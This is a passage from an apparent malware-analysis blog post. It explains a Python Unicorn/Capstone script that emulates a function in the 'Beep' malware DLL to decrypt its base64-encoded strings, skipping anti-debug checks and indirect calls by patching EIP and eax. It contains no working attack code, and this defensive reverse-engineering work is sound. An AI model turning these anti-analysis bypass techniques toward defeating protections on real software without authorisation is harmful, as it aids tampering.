</span></span><span style="display:flex;"><span>emu<span style="color:#f92672">.</span>emu_start(memory_base<span style="color:#f92672">+</span>start_address, memory_base<span style="color:#f92672">+</span>end_address)
</span></span></code></pre></div><h3 id="stack-memory-architecture-permissions">Stack, Memory, Architecture, permissions<a hidden class="anchor" aria-hidden="true" href="#stack-memory-architecture-permissions">#</a></h3>
<p>We start off by specifying:</p>
<ul>
<li>stack base and stack size: the space where calculations of the emulation will be happening&hellip;like a usual stack.</li>
<li>memory base and memory size: the memory space to which the code will be stored.</li>
</ul>
<p>For the stack base it does not really matter what we give it as a value as long as its a multiple of 5.<br>
For the memory base, we are giving as base the same base that IDA uses (0x10001000) in order to better debug any issues along the way. We also give enough space (1MB) for the code to be stored.
The relevant lines for these are:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>stack_base  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>
</span></span><span style="display:flex;"><span>stack_size  <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf000</span>
</span></span><span style="display:flex;"><span>memory_base <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10001000</span>
</span></span><span style="display:flex;"><span>memory_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">1024</span>
</span></span></code></pre></div><p>Next up, we specify the architecture that the code belongs which is 32 bit architecture. The relevant code is:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>emu <span style="color:#f92672">=</span> Uc(UC_ARCH_X86, UC_MODE_32)
</span></span><span style="display:flex;"><span>md <span style="color:#f92672">=</span> Cs(CS_ARCH_X86, CS_MODE_32)
</span></span></code></pre></div><p>We create two instances since the first one (emu) is for the <code>Unicorn</code> emulation and the second one (md) is for <code>Capstone</code>. Further more:</p>
<ul>
<li><code>Unicorn</code>: Emulates the program (runs it).</li>
<li><code>Capstone</code>: Gives access to the assembly such as mnemonics, opcodes etc.</li>
</ul>
<p>Lastly, we map into the allocated memory the address space for the stack and the address space for the memory:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>emu<span style="color:#f92672">.</span>mem_map(stack_base, stack_size)
</span></span><span style="display:flex;"><span>emu<span style="color:#f92672">.</span>mem_map(memory_base, memory_size, UC_PROT_ALL)
</span></span></code></pre></div><p>By using <code>UC_PROT_ALL</code> we basically give all permissions to the space related to the program (it can read, write and execute).</p>
<h3 id="hooking-the-code">Hooking the code<a hidden class="anchor" aria-hidden="true" href="#hooking-the-code">#</a></h3>
<p>The next line is responsible for hooking the code as it runs:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>emu<span style="color:#f92672">.</span>hook_add(UC_HOOK_CODE, hook_code)
</span></span></code></pre></div><p>What this basically means is that for each assembly line, the program will stop (like a breakpoint) and call the function we give as parameter (the <code>hook_code</code> one). This function is where we will write the code to access the actual assembly instructions, view register values etc.<br>
So we just emulate the program line by line, stopping at each one and inspecting the state of the program.</p>
<p>We will be breaking down the <code>hook_code</code> function shortly.</p>
<h3 id="patch-addresses">Patch addresses<a hidden class="anchor" aria-hidden="true" href="#patch-addresses">#</a></h3>
<p>We continue on by specifying a list of addresses that are going to be patched:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Since we will patch the program to skip calls to registers (call eax for example), we need to manually set the returned value from these calls. Basically, when call eax is happening, some indirect call to some code is going to be executed, which will return a value (for example 0 if everything went smoothly). But since we are avoiding these calls (since they lead to errors), we will be skipping these calls and also manually setting the return value of eax (since the return value is stored on eax). So by doing this, we pretend as if the code was executed successfully!
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>PATCH_ADDRESSES <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    memory_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x9f0</span>,
</span></span><span style="display:flex;"><span>    memory_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xa3e</span>,
</span></span><span style="display:flex;"><span>    memory_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xaa4</span>
</span></span><span style="display:flex;"><span>]
</span></span></code></pre></div><p>These addresses are not random. These addresses use the value in <code>eax</code> register to decide whether execution must continue or stop. Since we will be avoiding anti-debug checks, we will manually set <code>eax</code> to 0 in order to continue the execution.<br>
So these addresses represent the state of the program right before the checks, determining whether the code should continue or exit. Since these checks utilize the value of <code>eax</code>,  we manually found these and stored them in the list in order to change the <code>eax</code> value at that location in memory.</p>
<h3 id="reading-the-dll-and-allocating-text-rdata-sections">Reading the dll and allocating .text, .rdata sections<a hidden class="anchor" aria-hidden="true" href="#reading-the-dll-and-allocating-text-rdata-sections">#</a></h3>
<p>Next step is to read the actual dll and some of its sections. Specifically, we want to read and allocate the <code>.text</code> section as it contains some base64 encrypted values besides the executable code, but also the <code>.rdata</code> section as this as well contains base64 encrypted values:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pe_handle <span style="color:#f92672">=</span> pefile<span style="color:#f92672">.</span>PE(<span style="color:#e6db74">&#39;embedded_pe.dll&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>_text_section <span style="color:#f92672">=</span> pe_handle<span style="color:#f92672">.</span>sections[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>get_data()
</span></span><span style="display:flex;"><span>_rdata_section <span style="color:#f92672">=</span> pe_handle<span style="color:#f92672">.</span>sections[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>get_data()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Here we write the text section in the memory base which is at offset 0x1000 ad the rdata section at offset 0x3000 (3000 since the memory_base is 10001000 so if we add 2000 we end up in 10003000).
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">We decide this via the help of PeBear. PeBear shows the offsets and addresses of the txt section (which contains the code to be run amongst other things) and the rdata section at these offsets, so we write the data on the same addresses.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>emu<span style="color:#f92672">.</span>mem_write(memory_base, _text_section)
</span></span><span style="display:flex;"><span>emu<span style="color:#f92672">.</span>mem_write(memory_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2000</span>, _rdata_section)
</span></span></code></pre></div><p>We can see via <code>PE-Bear</code> (as the python comment states) the actual offsets of where the <code>.text</code> and <code>.rdata</code> sections start. For the <code>.text</code> section:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep22.png" alt=""  />
</p>
<p>And for the <code>.rdata</code> section:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep23.png" alt=""  />
</p>
<p>So this is why we used these offsets in our code. Everything must match up!</p>
<h3 id="setting-the-stack-pointer-in-the-middle">Setting the stack pointer in the middle<a hidden class="anchor" aria-hidden="true" href="#setting-the-stack-pointer-in-the-middle">#</a></h3>
<p>We set the stack pointer on the middle of the stack:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>emu<span style="color:#f92672">.</span>reg_write(UC_X86_REG_ESP, stack_base<span style="color:#f92672">+</span>stack_size<span style="color:#f92672">//</span><span style="color:#ae81ff">2</span>)
</span></span></code></pre></div><p>This is because programs many times modify the location of the stack via subtraction or addition and we ideally dont want to point somewhere outside of the stack. That&rsquo;s why we set the <code>ESP</code> in the middle to avoid such issues (at least its a good practise - thanks <a href="https://youtu.be/-CNy4qh08iU?t=371">OALABS</a>).</p>
<h3 id="patching-dwords">Patching dwords<a hidden class="anchor" aria-hidden="true" href="#patching-dwords">#</a></h3>
<p>There are some dwords that are used for some checks and based on whether they are set to a value or not, it calls some dlls.<br>
These calls are to Windows API functions which unicorn cannot handle and will lead to errors. So we will be skipping these addresses by setting the dwords to some rogue bytes:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>emu<span style="color:#f92672">.</span>mem_write(<span style="color:#ae81ff">0x10005000</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;X&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">12</span>)
</span></span></code></pre></div><p>We can see the relevant code here:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep24.png" alt=""  />
</p>
<p>If we click on one of these dwords, we will end up here:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep25.png" alt=""  />
</p>
<p>So since there are 3 dwords we would like to modify all three of them in order to skip the <code>if</code> statements, we write 12 bytes of a random byte &lsquo;X&rsquo; (12 / 3 = 4 byte each, as this is their size).</p>
<h3 id="emulating-the-code">Emulating the code<a hidden class="anchor" aria-hidden="true" href="#emulating-the-code">#</a></h3>
<p>Finally, we will emulate the code by stating the starting and ending address of the function we are interested in:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Find the addresses of which you want to execute code. By opening ida, the function of interest starts at 1c9 offset and ends at 9f8 offset.</span>
</span></span><span style="display:flex;"><span>start_address <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1c9</span> <span style="color:#75715e"># entry point</span>
</span></span><span style="display:flex;"><span>end_address <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xd92</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Start the emulation </span>
</span></span><span style="display:flex;"><span>emu<span style="color:#f92672">.</span>emu_start(memory_base<span style="color:#f92672">+</span>start_address, memory_base<span style="color:#f92672">+</span>end_address)
</span></span></code></pre></div><p>We can see the relevant function and its entry point here:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep26.png" alt=""  />
</p>
<p>So even if we have written the whole executable (<code>.text</code> section) in the memory space we defined earlier, we only need to run the code contained in this function. That&rsquo;s why in the <code>emu_start</code> we define the start and end addresses.</p>
<h3 id="viewing-the-hook_code-function">Viewing the hook_code function<a hidden class="anchor" aria-hidden="true" href="#viewing-the-hook_code-function">#</a></h3>
<p>Now that we have cleared some of the usage of the lines in the code, let&rsquo;s start analyzing the actual code that does all the emulation of the decryption of strings:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hook_code</span>(uc, address, size, user_data):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> curr_offset
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> address <span style="color:#f92672">==</span> memory_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x9f8</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># patch anti-debug calls</span>
</span></span><span style="display:flex;"><span>        uc<span style="color:#f92672">.</span>reg_write(UC_X86_REG_EIP, uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_EIP)<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> address <span style="color:#f92672">in</span> PATCH_ADDRESSES:
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># patch return values</span>
</span></span><span style="display:flex;"><span>        uc<span style="color:#f92672">.</span>reg_write(UC_X86_REG_EAX, <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> address <span style="color:#f92672">in</span> [<span style="color:#ae81ff">0x10001b84</span>, <span style="color:#ae81ff">0x10001bcc</span>]:
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        Based on the address, get the correct offset (from the assembly) in order to read the decrypted string properly from the start of the location it is saved.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        Since it&#39;s utf-16, decode correspondingly (size is for both enc strings 0x7b8).
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>        off <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x420c</span> <span style="color:#66d9ef">if</span> address <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x10001b84</span> <span style="color:#66d9ef">else</span> <span style="color:#ae81ff">0x3298</span>
</span></span><span style="display:flex;"><span>        dec <span style="color:#f92672">=</span> uc<span style="color:#f92672">.</span>mem_read(uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_EBP)<span style="color:#f92672">-</span>off, <span style="color:#ae81ff">0x7b8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>hex(address)<span style="color:#e6db74">}</span><span style="color:#e6db74"> :: </span><span style="color:#e6db74">{</span>b64decode(dec)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-16&#34;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> md<span style="color:#f92672">.</span>disasm(uc<span style="color:#f92672">.</span>mem_read(address, size), address):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i<span style="color:#f92672">.</span>mnemonic <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;cmp&#39;</span>:
</span></span><span style="display:flex;"><span>            ops <span style="color:#f92672">=</span> i<span style="color:#f92672">.</span>op_str<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;, &#39;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ops[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;ecx&#39;</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                Usually in the decryption, there is a loop and we need to check whether the cmp in the loop is with a hardcoded value or with a register. Based on static analysis, there was either a check with a numeric value or with edi register. That is why we check for edi or else we eval() the number from str type to int.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                Also, in ecx there was the counter of the loop stored. That&#39;s why we read it. We could also just keep a counter here.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>                ecx <span style="color:#f92672">=</span> uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_ECX)
</span></span><span style="display:flex;"><span>                val <span style="color:#f92672">=</span> ops[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> val <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;edi&#39;</span>:
</span></span><span style="display:flex;"><span>                    val <span style="color:#f92672">=</span> uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_EDI)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                    val <span style="color:#f92672">=</span> eval(val)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> ecx <span style="color:#f92672">==</span> val:
</span></span><span style="display:flex;"><span>                    <span style="color:#75715e"># If the loop is complete, proceed to read the decrypted value.</span>
</span></span><span style="display:flex;"><span>                    dec <span style="color:#f92672">=</span> uc<span style="color:#f92672">.</span>mem_read(uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_EBP)<span style="color:#f92672">-</span>curr_offset, val)
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">in</span> dec:
</span></span><span style="display:flex;"><span>                        <span style="color:#75715e"># If it has null bytes inside, its utf-16 so we need to read double the size before decoding from utf-16</span>
</span></span><span style="display:flex;"><span>                        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>hex(address)<span style="color:#e6db74">}</span><span style="color:#e6db74"> :: </span><span style="color:#e6db74">{</span>uc<span style="color:#f92672">.</span>mem_read(uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_EBP)<span style="color:#f92672">-</span>curr_offset, val<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-16&#34;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>                        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>hex(address)<span style="color:#e6db74">}</span><span style="color:#e6db74"> :: </span><span style="color:#e6db74">{</span>dec<span style="color:#f92672">.</span>decode()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i<span style="color:#f92672">.</span>mnemonic <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;mov&#39;</span>:
</span></span><span style="display:flex;"><span>            ops <span style="color:#f92672">=</span> i<span style="color:#f92672">.</span>op_str<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;, &#39;</span>)  <span style="color:#75715e"># get source and destination operands</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;ptr [ebp +&#39;</span> <span style="color:#f92672">in</span> ops[<span style="color:#ae81ff">0</span>]:  <span style="color:#75715e"># i want ebp+ecx to be the destination operand</span>
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># from commands like byte ptr [ebp + ecx - 0x1f0], al get only the 0x1f0 part</span>
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># We need the offset to later find the address of where the decrypted string is stored</span>
</span></span><span style="display:flex;"><span>                curr_offset <span style="color:#f92672">=</span> eval(i<span style="color:#f92672">.</span>op_str<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; - &#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;], &#39;</span>)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> i<span style="color:#f92672">.</span>mnemonic <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;call&#39;</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># skip indirect calls</span>
</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># for example call eax would make an indirect call to a function or some dll. We want to avoid that as it leads to errors</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> i<span style="color:#f92672">.</span>op_str <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#39;eax&#39;</span>, <span style="color:#e6db74">&#39;ebx&#39;</span>, <span style="color:#e6db74">&#39;esi&#39;</span>]:
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># move eip by 2 bytes</span>
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># call [register] is 2 bytes in total so thats why we modify EIP by 2</span>
</span></span><span style="display:flex;"><span>                uc<span style="color:#f92672">.</span>reg_write(UC_X86_REG_EIP, uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_EIP)<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>)
</span></span></code></pre></div><p>Let&rsquo;s further break down this code comparing it with IDA to get the full logic behind it. The general structure is:</p>
<ul>
<li><strong>Anti-debug checks</strong>: The code avoids specific addresses that contain anti-debug checks.</li>
<li><strong>Patching eax</strong>: The code changes the value of eax to continue the execution of the program as normal.</li>
<li><strong>Decrypting b64 encrypted data</strong>: The code gets the b64 encrypted data right after they have been decrypted.</li>
<li><strong>Main loop</strong>: The code contains a main loop responsible for checking the current instruction and based on the mnemonic do further actions (decryption, patching etc).</li>
</ul>
<h4 id="anti-debug-checks">Anti-debug checks<a hidden class="anchor" aria-hidden="true" href="#anti-debug-checks">#</a></h4>
<p>Taking a look at IDA, we see a call at a function <code>sub_100021DD</code>:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep27.png" alt=""  />
</p>
<p>By opening this function, we see calls to 4 more functions:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">sub_100021DD</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">sub_10002103</span>() <span style="color:#f92672">||</span> <span style="color:#a6e22e">sub_10002128</span>() <span style="color:#f92672">||</span> <span style="color:#a6e22e">sub_1000214B</span>() <span style="color:#f92672">||</span> <span style="color:#a6e22e">sub_100021B7</span>() <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>These either use <code>PEB</code> or other structures and elements that lead to our emulation crashing. For this reason we decided it would be better to avoid the call to that function in order to keep the emulation going. After all, we only want to get the decrypted strings, not actually run the malware.</p>
<p>The relevant part that skips the call to this function is the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> address <span style="color:#f92672">==</span> memory_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x9f8</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># patch anti-debug calls</span>
</span></span><span style="display:flex;"><span>    uc<span style="color:#f92672">.</span>reg_write(UC_X86_REG_EIP, uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_EIP)<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span>)
</span></span></code></pre></div><p>What we do here is check if the current address (<strong>Remember that the <code>hook_code</code> function is being called at each instruction</strong>) is the one making the call to <code>sub_100021DD</code>. Basically, <code>memory_base + offset</code> gives us the <code>virtual address</code> of the call (<code>base+rva=va</code>).</p>
<p>Then, if this is the case and we have stopped at that call, we change <code>EIP</code> to point to 5 bytes forward.<br>
Why? Well, first off, <code>EIP</code> is the Instruction Pointer and shows what is going to be executed. So since we want to skip this call, we point to the next instruction which exists in an address increased by 5 bytes:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep28.png" alt=""  />
</p>
<p>This is the reason of why we skip 5 bytes forward.</p>
<h4 id="patching-eax">Patching eax<a hidden class="anchor" aria-hidden="true" href="#patching-eax">#</a></h4>
<p>Next up, we are patching the <code>eax</code> value in some specific addresses. The addresses are:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>PATCH_ADDRESSES <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    memory_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x9f0</span>,
</span></span><span style="display:flex;"><span>    memory_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xa3e</span>,
</span></span><span style="display:flex;"><span>    memory_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xaa4</span>
</span></span><span style="display:flex;"><span>]
</span></span></code></pre></div><p>And the relevant code that checks if we stopped in one of these functions is:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> address <span style="color:#f92672">in</span> PATCH_ADDRESSES:
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># patch return values</span>
</span></span><span style="display:flex;"><span>    uc<span style="color:#f92672">.</span>reg_write(UC_X86_REG_EAX, <span style="color:#ae81ff">0</span>)
</span></span></code></pre></div><p>So whenever the address is one of these, we change the <code>eax</code> value to 0.<br>
But why? Let&rsquo;s view the relevant addresses.</p>
<h5 id="offset-0x9f0">Offset 0x9f0<a hidden class="anchor" aria-hidden="true" href="#offset-0x9f0">#</a></h5>
<p>Hitting G in IDA and typing the <code>base address + the offset (0x10019f0)</code>, we end up here:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep29.png" alt=""  />
</p>
<p>After the call to a function is complete, <code>eax</code> is being checked in an <code>if</code> statement. Usually, functions save the return value to <code>eax</code>. Here, the <code>sub_1000113B</code> was called. It does not matter what this function does. All we care about is continuing emulation, so we patch <code>eax</code> to be 0 in order to bypass the <code>if</code> statement and continue forward.</p>
<h5 id="offset-0xa3e">Offset 0xa3e<a hidden class="anchor" aria-hidden="true" href="#offset-0xa3e">#</a></h5>
<p>Next offset is 0xa3e, and here <code>eax</code> is being compared to the number 183 after a call to <code>eax</code> has been made:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep30.png" alt=""  />
</p>
<p>we again modify it to 0 in order to continue emulation. As we will see <a href="https://connar.github.io/posts/beepmalware/#main-loop---call-instruction">later</a>, we will also avoid calls to <code>eax</code> as this was leading to errors.</p>
<h5 id="offset-0xaa4">Offset 0xaa4<a hidden class="anchor" aria-hidden="true" href="#offset-0xaa4">#</a></h5>
<p>Once again, a call to <code>eax</code> is being made and then <code>eax</code> is being checked:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep31.png" alt=""  />
</p>
<p>by patching <code>eax</code> to 0, code continues normally.</p>
<h4 id="decrypting-b64-encrypted-data">Decrypting b64 encrypted data<a hidden class="anchor" aria-hidden="true" href="#decrypting-b64-encrypted-data">#</a></h4>
<p>The next part of our code is responsible for locating and decrypting some base64 encrypted data found through either IDA or PE-Bear:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> address <span style="color:#f92672">in</span> [<span style="color:#ae81ff">0x10001b84</span>, <span style="color:#ae81ff">0x10001bcc</span>]:
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Based on the address, get the correct offset (from the assembly) in order to read the decrypted string properly from the start of the location it is saved.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Since it&#39;s utf-16, decode correspondingly (size is for both enc strings 0x7b8).
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    off <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x420c</span> <span style="color:#66d9ef">if</span> address <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x10001b84</span> <span style="color:#66d9ef">else</span> <span style="color:#ae81ff">0x3298</span>
</span></span><span style="display:flex;"><span>    dec <span style="color:#f92672">=</span> uc<span style="color:#f92672">.</span>mem_read(uc<span style="color:#f92672">.</span>reg_read(UC_X86_REG_EBP)<span style="color:#f92672">-</span>off, <span style="color:#ae81ff">0x7b8</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">{</span>hex(address)<span style="color:#e6db74">}</span><span style="color:#e6db74"> :: </span><span style="color:#e6db74">{</span>b64decode(dec)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-16&#34;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span></code></pre></div><p>The addresses correspond to the following code in IDA:</p>
<p><img loading="lazy" src="/posts/beepMalware/beep32.png" alt=""  />
</p>
<p>We found which offset to the stack corresponds to each encrypted b64 string (as shown in the <code>movups</code> instruction in IDA) based on the current address.<br>
Then, we proceeded to read the whole decrypted string by subtracting the offset previously found (to go back to the start of the point in stack the program started writing down the decrypted values byte by byte) and multiplying its size (0x7b8) by 2 since its a <code>utf-16</code> encoded string (found out through debugging).</p>
